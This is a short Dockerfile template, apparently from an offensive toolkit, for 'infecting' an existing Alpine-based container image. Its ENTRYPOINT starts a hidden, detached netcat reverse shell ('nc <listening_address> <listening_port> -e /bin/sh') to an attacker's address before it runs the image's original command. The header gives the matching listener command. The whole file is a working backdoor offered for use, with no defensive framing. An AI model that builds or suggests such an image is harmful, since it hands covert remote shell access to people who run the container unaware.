#### Description ############################################################################
# Infection type:  Reverse shell (netcat)
# Distribution:    Alpine Linux
# Listener:        rlwrap -cAr nc -lvnp <listening_port>
####

FROM <name_of_image_to_infect>

RUN apk add screen
ENTRYPOINT screen -d -m nc <listening_address> <listening_port> -e /bin/sh && <original_ENTRYPOINT_command> <original_CMD_command>
